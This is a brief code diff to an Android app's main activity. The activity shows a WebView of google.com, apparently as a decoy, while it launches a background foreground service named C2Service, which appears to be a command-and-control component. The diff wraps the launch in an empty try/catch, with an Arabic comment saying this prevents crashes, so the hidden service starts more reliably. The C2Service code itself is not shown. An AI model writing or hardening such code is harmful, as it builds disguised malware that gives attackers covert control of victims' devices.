@@ -11,13 +11,17 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle b) {
         super.onCreate(b);
 
-        WebView w = new WebView(this);
-        w.getSettings().setJavaScriptEnabled(true);
-        w.loadUrl("https://www.google.com");
-        setContentView(w);
+        try {
+            WebView w = new WebView(this);
+            w.getSettings().setJavaScriptEnabled(true);
+            w.loadUrl("https://www.google.com");
+            setContentView(w);
 
-        Intent i = new Intent(this, C2Service.class);
-        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
-        else startService(i);
+            Intent i = new Intent(this, C2Service.class);
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
+            else startService(i);
+        } catch (Exception e) {
+            // منع الانهيار
+        }
     }
 }
